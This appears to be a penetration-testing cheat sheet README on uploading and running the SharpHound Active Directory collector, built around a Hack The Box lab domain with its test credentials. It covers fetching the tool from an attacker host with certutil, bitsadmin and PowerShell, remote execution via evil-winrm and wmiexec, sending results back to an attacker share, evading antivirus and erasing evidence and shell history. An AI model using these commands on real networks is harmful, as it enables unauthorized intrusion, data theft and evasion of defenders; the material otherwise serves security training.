<!-- CYBERPUNK HEADER -->
<div align="center">

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  ███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗  ║
║  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗ ║
║  ███████╗███████║███████║██████╔╝██████╔╝███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║ ║
║  ╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║ ║
║  ███████║██║  ██║██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝ ║
║  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝  ║
║                                                                              ║
║                  🩸 [ C# BLOODHOUND COLLECTOR ] 🩸                           ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

<!-- BADGES -->
![Tool](https://img.shields.io/badge/TOOL-SharpHound-red?style=for-the-badge&logo=windows&logoColor=white)
![Active Directory](https://img.shields.io/badge/ACTIVE_DIRECTORY-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
![Enumeration](https://img.shields.io/badge/ENUMERATION-00FF00?style=for-the-badge&logo=hackthebox&logoColor=black)

[![Author](https://img.shields.io/badge/Author-0xNetrunner-00FF00?style=flat-square&logo=github)](https://github.com/00xNetrunner)
![Category](https://img.shields.io/badge/Category-AD_Recon-purple?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)

</div>

---

> **`[SYSTEM]`** Official BloodHound data collector for Windows environments
>
> **`[STATUS]`** Module: `LOADED` | Target: `ACTIVE_DIRECTORY` | Protocol: `LDAP/SMB`

---

## 📋 >_ Table.Of.Contents()

- [Overview](#-overview)
- [Upload Methods to Target](#-upload-methods-to-target)
- [Basic Usage](#-basic-usage)
- [Collection Methods](#-collection-methods)
- [Advanced Options](#-advanced-options)
- [BloodHound Python Equivalent](#-bloodhound-python-equivalent)
- [Download Results](#-download-results)
- [Troubleshooting](#-troubleshooting)

---

## 🎯 Overview

```
> Loading module: SharpHound.exe...
> Initializing AD enumeration engine...
> Status: READY
```

**SharpHound** is the official data collector for BloodHound written in C#. It enumerates Active Directory environments to map attack paths and privilege escalation opportunities.

### ⚡ Key Features

```
[✓] Native Windows execution (no dependencies)
[✓] Multiple collection methods
[✓] LDAP and API-based enumeration
[✓] Stealth and performance options
[✓] Outputs ZIP files for BloodHound ingestion
```

### 📦 Version Information

| Property | Value |
|:---------|:------|
| **Latest Version** | 2.8.0 (as of November 2025) |
| **Compatibility** | BloodHound Community Edition (CE) |
| **Download** | [GitHub Releases](https://github.com/SpecterOps/SharpHound/releases) |
| **Target Framework** | .NET 4.6.2 |

> ⚠️ **`[WARNING]`** Make sure your SharpHound version matches your BloodHound version! Check the compatible version in BloodHound CE's web UI under Settings → Download Collectors.

---

## 📤 Upload Methods to Target

### 🔧 Method 1: SMB Server (impacket-smbserver)

**On Kali Linux:**
```bash
# Start SMB server in directory containing SharpHound.exe
sudo impacket-smbserver share . -smb2support -username user -password pass

# Or without authentication (less secure)
sudo impacket-smbserver share . -smb2support
```

**On Target Windows:**
```powershell
# With authentication
net use \\10.10.14.5\share /user:user pass
copy \\10.10.14.5\share\SharpHound.exe .

# Without authentication
copy \\10.10.14.5\share\SharpHound.exe .

# Alternative: Run directly from SMB share
\\10.10.14.5\share\SharpHound.exe -c All
```

---

### 🔧 Method 2: Python Web Server

**On Kali Linux:**
```bash
# Python 3 (default in Kali)
python3 -m http.server 8000

# Python 3 with specific IP binding
python3 -m http.server 8000 --bind 10.10.14.5
```

**On Target Windows:**
```powershell
# PowerShell Download
Invoke-WebRequest -Uri http://10.10.14.5:8000/SharpHound.exe -OutFile SharpHound.exe

# Short form
iwr -uri http://10.10.14.5:8000/SharpHound.exe -o SharpHound.exe

# Certutil (alternative method)
certutil -urlcache -f http://10.10.14.5:8000/SharpHound.exe SharpHound.exe

# BITSAdmin
bitsadmin /transfer mydownload /download /priority high http://10.10.14.5:8000/SharpHound.exe C:\Temp\SharpHound.exe
```

---

### 🔧 Method 3: WinRM Upload (evil-winrm)

**Using evil-winrm:**
```bash
# Connect to target
evil-winrm -i 10.10.11.41 -u judith.mader -p judith09

# Once connected, upload SharpHound
upload /path/to/SharpHound.exe
```

**Within evil-winrm session:**
```powershell
*Evil-WinRM* PS C:\Users\judith.mader\Documents> upload /opt/SharpHound.exe
*Evil-WinRM* PS C:\Users\judith.mader\Documents> .\SharpHound.exe -c All
```

---

### 🔧 Method 4: Base64 Encoding (Small Files)

**On Kali Linux:**
```bash
# Encode SharpHound
base64 -w 0 SharpHound.exe > sharphound_b64.txt
```

**On Target Windows:**
```powershell
# Decode and save (paste base64 string)
$b64 = "TVqQAAMAAAAEAAAA..." # Your base64 string
[IO.File]::WriteAllBytes("SharpHound.exe", [Convert]::FromBase64String($b64))
```

---

## 🚀 Basic Usage

### Standard Execution

```powershell
# Run all collection methods (most common)
.\SharpHound.exe --CollectionMethods All

# Short form also works
.\SharpHound.exe -c All

# Run with specific collection methods
.\SharpHound.exe -c Session,LoggedOn

# Specify domain explicitly
.\SharpHound.exe -c All -d certified.htb

# Custom output directory
.\SharpHound.exe -c All --OutputDirectory C:\Temp

# Custom output prefix
.\SharpHound.exe -c All --OutputPrefix custom_name

# Automatically create ZIP file (recommended)
.\SharpHound.exe -c All --ZipFileName output.zip
```

---

## 🎯 Collection Methods

| Method | Description | Usage |
|:-------|:------------|:------|
| **All** | Runs all collection methods except LoggedOn | `-c All` |
| **Default** | Group, LocalAdmin, Session, Trusts | `-c Default` |
| **DCOnly** | LDAP-only, no computer queries | `-c DCOnly` |
| **Group** | Group memberships | `-c Group` |
| **LocalAdmin** | Local admin rights | `-c LocalAdmin` |
| **Session** | Active sessions | `-c Session` |
| **Trusts** | Domain trusts | `-c Trusts` |
| **ACL** | Object permissions | `-c ACL` |
| **Container** | OU structure | `-c Container` |
| **GPOLocalGroup** | GPO-enforced groups | `-c GPOLocalGroup` |
| **SPNTargets** | Service Principal Names | `-c SPNTargets` |
| **LoggedOn** | Logged on users (privileged) | `-c LoggedOn` |
| **ObjectProps** | Object properties | `-c ObjectProps` |
| **RDP** | RDP access rights | `-c RDP` |
| **DCOM** | DCOM access rights | `-c DCOM` |
| **PSRemote** | PSRemote access | `-c PSRemote` |
| **CARegistry** | AD CS registry keys | `-c CARegistry` |
| **DCRegistry** | DC registry data | `-c DCRegistry` |

### Combining Methods

```powershell
# Multiple methods
.\SharpHound.exe -c Group,Session,Trusts

# Comprehensive collection
.\SharpHound.exe -c All

# LDAP-only (stealth, no computer connections)
.\SharpHound.exe -c DCOnly
```

---

## ⚙️ Advanced Options

### 🖥️ Domain Controller Specification

```powershell
# Specify domain controller by IP
.\SharpHound.exe -c All -d certified.htb --DomainController 10.10.11.41

# Specify by hostname
.\SharpHound.exe -c All -d certified.htb --DomainController DC01.certified.htb

# Multiple domains
.\SharpHound.exe -c All -d certified.htb,external.local
```

### 🔐 Authentication Options

```powershell
# Use LDAP credentials (alternate to current user context)
.\SharpHound.exe -c All --LdapUsername judith.mader --LdapPassword judith09

# Run with different user context using runas
runas /user:certified.htb\judith.mader /netonly cmd
# Then run SharpHound from that context
.\SharpHound.exe -c All -d certified.htb

# Override username for NetSessionEnum
.\SharpHound.exe -c Session --OverrideUserName judith.mader
```

### 🔒 Performance & Stealth

```powershell
# Stealth mode (slower, LDAP-focused, removes noisy methods)
.\SharpHound.exe -c All --Stealth

# Throttle requests (milliseconds between requests)
.\SharpHound.exe -c All --Throttle 1000

# Jitter (randomize delay, percentage)
.\SharpHound.exe -c All --Jitter 20

# Skip port scan (don't check if 445 is open)
.\SharpHound.exe -c All --SkipPortCheck

# No save cache
.\SharpHound.exe -c All --NoSaveCache

# Disable certificate verification (LDAPS)
.\SharpHound.exe -c All --DisableCertVerification

# Disable Kerberos signing/sealing (not recommended)
.\SharpHound.exe -c All --DisableSigning
```

### 🌐 LDAP Options

```powershell
# Specify LDAP port (default 389)
.\SharpHound.exe -c All --LdapPort 389

# Use secure LDAP (port 636)
.\SharpHound.exe -c All --SecureLDAP

# Combine LDAPS with specific port
.\SharpHound.exe -c All --LdapPort 636 --SecureLDAP

# Use Global Catalog port
.\SharpHound.exe -c All --LdapPort 3268
```

### 🔄 Loop Collection

```powershell
# Loop collection (great for session gathering)
# Loops for 2 hours, creating a ZIP file after each iteration
.\SharpHound.exe -c Session --Loop --Loopduration 02:00:00

# Loop with interval between iterations
# Runs for 3 hours, waits 10 minutes between each collection
.\SharpHound.exe -c Session --Loop --Loopduration 03:00:00 --LoopInterval 00:10:00
```

### 🚫 Exclusions & Filters

```powershell
# Exclude domain controllers from enumeration
.\SharpHound.exe -c All --ExcludeDCs

# Skip registry-based enumeration
.\SharpHound.exe -c All --SkipRegistryLoggedOn

# Use specific computer list file
.\SharpHound.exe -c All --ComputerFile C:\computers.txt

# LDAP filter for computers
.\SharpHound.exe -c All --LdapFilter "(operatingSystem=*Server*)"
```

### 📁 Output Options

```powershell
# Prettify JSON output (larger files, more readable)
.\SharpHound.exe -c All --PrettyPrint

# Track computer connection status to CSV
.\SharpHound.exe -c All --TrackComputerCalls

# Random file names for output
.\SharpHound.exe -c All --RandomFilenames
```

---

## 🐍 BloodHound Python Equivalent

### Your Original Command

```bash
sudo bloodhound-python -c all -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 --zip
```

### SharpHound Equivalent

**Option 1: Direct Execution (Already authenticated as judith.mader)**

```powershell
# If you're already authenticated as judith.mader on Windows
.\SharpHound.exe -c All -d certified.htb --DomainController 10.10.11.41 --ZipFileName certified_bloodhound.zip
```

**Option 2: Using LDAP Credentials**

```powershell
# Use alternate credentials via LDAP authentication
.\SharpHound.exe -c All -d certified.htb --DomainController 10.10.11.41 --LdapUsername judith.mader --LdapPassword judith09
```

**Option 3: Using RunAs with Network Credentials**

```powershell
# Run cmd with network credentials
runas /user:certified.htb\judith.mader /netonly cmd

# In the new cmd window
.\SharpHound.exe -c All -d certified.htb --DomainController 10.10.11.41
```

**Option 4: Using evil-winrm**

```bash
# From Kali, connect via WinRM
evil-winrm -i 10.10.11.41 -u judith.mader -p judith09

# Upload and run SharpHound
upload /path/to/SharpHound.exe
.\SharpHound.exe -c All -d certified.htb --DomainController 10.10.11.41
```

**Option 5: Using Impacket's psexec/wmiexec**

```bash
# Execute SharpHound remotely
impacket-wmiexec certified.htb/judith.mader:judith09@10.10.11.41 "C:\Temp\SharpHound.exe -c All"
```

### 📊 Parameter Mapping

| bloodhound-python | SharpHound.exe | Description |
|:------------------|:---------------|:------------|
| `-c all` | `-c All` or `--CollectionMethods All` | Collection method |
| `-u judith.mader` | `--LdapUsername judith.mader` | Username (or use current context) |
| `-p judith09` | `--LdapPassword judith09` | Password (or use current context) |
| `-d certified.htb` | `-d certified.htb` or `--Domain certified.htb` | Domain |
| `-ns 10.10.11.41` | `--DomainController 10.10.11.41` | Domain controller |
| `--zip` | `--ZipFileName output.zip` | ZIP output (default behavior) |

---

## 📥 Download Results

### 🔧 Method 1: SMB Server (Retrieve Files)

```powershell
# On Windows, copy results back
copy 20241127*.zip \\10.10.14.5\share\
```

### 🔧 Method 2: Evil-WinRM Download

```powershell
# In evil-winrm session
download C:\Path\To\20241127_BloodHound.zip
```

### 🔧 Method 3: Base64 Encoding (Small ZIP files)

**On Windows:**
```powershell
# Encode the ZIP file
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("20241127_BloodHound.zip"))
$b64 | Out-File -Encoding ASCII bloodhound_b64.txt
```

**On Kali:**
```bash
# Copy the base64 string and decode
base64 -d bloodhound_b64.txt > bloodhound_data.zip
```

### 🔧 Method 4: Python Web Server Upload

**On Windows (with Python):**
```powershell
# Start simple HTTP server
python -m http.server 8080

# Then download from Kali
wget http://10.10.11.41:8080/20241127_BloodHound.zip
```

---

## 🔥 Common Usage Scenarios

### Scenario 1: Quick Full Enumeration

```powershell
# Complete enumeration with ZIP output
.\SharpHound.exe -c All -d certified.htb --ZipFileName certified_full.zip
```

### Scenario 2: Session Hunting

```powershell
# Loop session collection for 2 hours, checking every 10 minutes
.\SharpHound.exe -c Session --Loop --Loopduration 02:00:00 --LoopInterval 00:10:00
```

### Scenario 3: Stealth Enumeration

```powershell
# Stealth mode (LDAP-focused, removes noisy methods like LoggedOn)
.\SharpHound.exe -c All --Stealth

# Manual stealth (custom throttling and jitter)
.\SharpHound.exe -c Group,ACL,ObjectProps --Throttle 2000 --Jitter 25
```

### Scenario 4: LDAP-Only Collection (No Computer Connections)

```powershell
# DCOnly - only queries domain controller via LDAP
.\SharpHound.exe -c DCOnly -d certified.htb

# Exclude DCs from computer enumeration
.\SharpHound.exe -c All --ExcludeDCs
```

### Scenario 5: Specific Data Only

```powershell
# Only collect groups and trusts
.\SharpHound.exe -c Group,Trusts -d certified.htb

# Default collection (Group, LocalAdmin, Session, Trusts)
.\SharpHound.exe -c Default
```

### Scenario 6: Multi-Domain Environment

```powershell
# Enumerate trust relationships first
.\SharpHound.exe -c Trusts

# Then enumerate specific domains
.\SharpHound.exe -c All -d certified.htb,child.certified.htb

# Or enumerate entire forest
.\SharpHound.exe -c All --SearchForest
```

### Scenario 7: Using LDAPS (Secure LDAP)

```powershell
# Use LDAPS for encrypted communication
.\SharpHound.exe -c All --SecureLDAP -d certified.htb
```

---

## 🐛 Troubleshooting

### Common Errors

#### "Could not resolve domain"
```powershell
# Solution: Specify domain controller explicitly
.\SharpHound.exe -c All -d certified.htb --DomainController 10.10.11.41
```

#### "Access Denied"
```powershell
# Verify credentials and permissions
whoami /all

# Check domain connectivity
nltest /dsgetdc:certified.htb

# Try using LDAP credentials
.\SharpHound.exe -c All --LdapUsername judith.mader --LdapPassword judith09
```

#### "LDAP connection failed"
```powershell
# Try different LDAP port (Global Catalog)
.\SharpHound.exe -c All --LdapPort 3268

# Try plain LDAP
.\SharpHound.exe -c All --LdapPort 389

# Try LDAPS (secure)
.\SharpHound.exe -c All --SecureLDAP

# Disable signing (not recommended, but may help)
.\SharpHound.exe -c All --DisableSigning
```

#### No output file generated
```powershell
# Specify output directory with write permissions
.\SharpHound.exe -c All --OutputDirectory C:\Temp

# Check for actual errors in console output
# Ensure you have permissions to current directory
```

#### "Port 445 not open" errors
```powershell
# Skip port checks (useful in restricted environments)
.\SharpHound.exe -c All --SkipPortCheck
```

### Performance Issues

```powershell
# Add throttling (wait time between requests)
.\SharpHound.exe -c All --Throttle 500 --Jitter 15

# Reduce to LDAP-only collection
.\SharpHound.exe -c DCOnly
```

### Detection/AV Issues

```powershell
# Use stealth mode
.\SharpHound.exe -c All --Stealth

# Run from memory (use PowerShell wrapper)
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Obfuscate or recompile SharpHound from source
```

---

## 📊 Output Files

SharpHound generates the following files:

| File | Description |
|:-----|:------------|
| `YYYYMMDDHHMMSS_BloodHound.zip` | Main output (import to BloodHound) |
| `YYYYMMDDHHMMSS_computers.json` | Computer objects |
| `YYYYMMDDHHMMSS_users.json` | User objects |
| `YYYYMMDDHHMMSS_groups.json` | Group objects |
| `YYYYMMDDHHMMSS_domains.json` | Domain information |
| `YYYYMMDDHHMMSS_gpos.json` | Group Policy Objects |
| `YYYYMMDDHHMMSS_ous.json` | Organizational Units |
| `YYYYMMDDHHMMSS_containers.json` | Container objects |

**Import to BloodHound:**
```bash
# On Kali, start BloodHound
sudo neo4j start
bloodhound

# Upload the ZIP file through the GUI
# Or use bloodhound-python to directly upload
```

---

## 🔗 Useful Resources

| Resource | URL |
|:---------|:----|
| 🔗 SharpHound GitHub (Official) | https://github.com/SpecterOps/SharpHound |
| 📖 BloodHound CE Documentation | https://bloodhound.specterops.io/ |
| 📋 SharpHound Flags Reference | https://bloodhound.specterops.io/collect-data/ce-collection/sharphound-flags |
| 💾 Download SharpHound | https://github.com/SpecterOps/SharpHound/releases |
| 🐕 BloodHound GitHub | https://github.com/SpecterOps/BloodHound |
| 📰 SpecterOps Blog | https://posts.specterops.io/ |
| 💬 BloodHound Slack | https://bloodhoundgang.herokuapp.com/ |

### Alternative Collectors

| Tool | Description |
|:-----|:------------|
| **RustHound** | Rust-based collector (cross-platform, AV evasion) |
| **AzureHound** | Azure AD/Entra ID collector |
| **SharpHound.ps1** | PowerShell wrapper for in-memory execution |

---

## 💡 Pro Tips

```
[01] Always create ZIP files - Use --ZipFileName output.zip for easier exfiltration and import
[02] Use loop collection for sessions - Session data changes frequently; loop for better coverage
[03] Start with Default or All collection - Get comprehensive data first, then target specific areas
[04] Check SharpHound version compatibility - Match SharpHound version to your BloodHound instance
[05] Use --Stealth for red teams - Automatically removes noisy collection methods
[06] Leverage --SearchForest - Enumerate all domains in forest automatically (requires trust)
[07] Time your collection wisely - Run during business hours for more active sessions
[08] Use LDAPS when possible - --SecureLDAP encrypts LDAP traffic
[09] Consider AV/EDR detection - SharpHound is heavily signatured; consider obfuscation
[10] Clean up after yourself - Delete SharpHound and output files during operations
[11] Document your collection - Note which methods were used and when
[12] Use --LdapUsername/--LdapPassword - When you can't use runas or current context
[13] Combine with other tools - Use with PowerView, ADRecon, Certify for full coverage
[14] Review collection methods - Not all methods are needed; DCOnly is great for stealth
```

### Advanced Tips

```
[→] Registry-based collection is noisy - Consider excluding with --SkipRegistryLoggedOn
[→] Computer file lists work great - Use --ComputerFile to target specific systems
[→] Global Catalog port (3268) can sometimes bypass restrictions
[→] TrackComputerCalls helps identify connectivity issues
[→] RandomFilenames can help avoid simple file-based detections
```

---

## ⚠️ Operational Security

```powershell
# Delete evidence after exfiltration
del SharpHound.exe
del *_BloodHound.zip
del *_computers.json
del *_users.json
# ... delete all output files

# Clear PowerShell history
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Check for running processes
Get-Process | Where-Object {$_.ProcessName -like "*sharp*"}
```

---

<div align="center">

## 👤 >_ Author.Info()

```
╔══════════════════════════════════════════════════════════════╗
║                     [ NETRUNNER PROFILE ]                    ║
╠══════════════════════════════════════════════════════════════╣
║  HANDLE      :  0xNetrunner                                  ║
║  CLASS       :  4th Year Ethical Hacking Student             ║
║  SPECIALTY   :  Active Directory | Penetration Testing       ║
║  STATUS      :  Active                                       ║
╚══════════════════════════════════════════════════════════════╝
```

[![GitHub](https://img.shields.io/badge/GitHub-0xNetrunner-181717?style=for-the-badge&logo=github)](https://github.com/00xNetrunner)

---

```
╔═══════════════════════════════════════════════════════════════╗
║                  [ END OF TRANSMISSION ]                      ║
║                    HACK THE PLANET! 🌐                        ║
╚═══════════════════════════════════════════════════════════════╝
```

![SharpHound](https://img.shields.io/badge/TOOL-SharpHound-red?style=flat-square)
![BloodHound](https://img.shields.io/badge/COLLECTOR-BloodHound-blue?style=flat-square)

</div>
